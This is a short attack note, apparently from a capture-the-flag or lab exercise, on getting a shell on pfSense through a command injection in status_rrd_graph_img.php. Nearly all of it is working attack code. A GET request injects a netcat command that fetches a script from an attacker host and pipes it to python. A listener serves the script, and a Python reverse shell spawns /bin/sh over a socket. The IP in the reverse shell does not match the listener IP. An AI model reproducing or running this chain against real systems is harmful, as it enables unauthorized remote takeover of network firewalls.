# Getting a Shell

## [Command Injection](https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/) in status_rrd_graph_img.php
Payload
```bash
GET /status_rrd_graph_img.php?database=queues;nc+10.10.14.21+9001|python HTTP/1.1
```


Content of rev.py

```bash
nc -lvnp 9001 < rev.py 
```

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

![[Pasted image 20211106053620.png]]

